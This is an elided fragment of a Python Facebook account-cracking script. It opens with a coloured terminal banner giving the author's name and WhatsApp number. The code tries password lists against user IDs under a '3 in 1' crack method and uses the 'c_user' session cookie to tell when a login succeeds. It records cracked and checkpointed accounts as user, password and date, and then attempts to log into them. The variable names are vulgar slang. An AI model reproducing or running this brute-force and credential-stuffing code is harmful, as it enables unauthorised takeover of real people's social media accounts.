...
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m Rehan Nawaz       \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m 03139547148          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mFacebook  : \033[1;92m  Rehan Nawaz          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mYoutube  :  \033[1;92m  2022\033[1;31;1m █
    ...
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Rehu-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[Rehu-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]","\x1b[1;92m[REHAN]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[Rehu-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
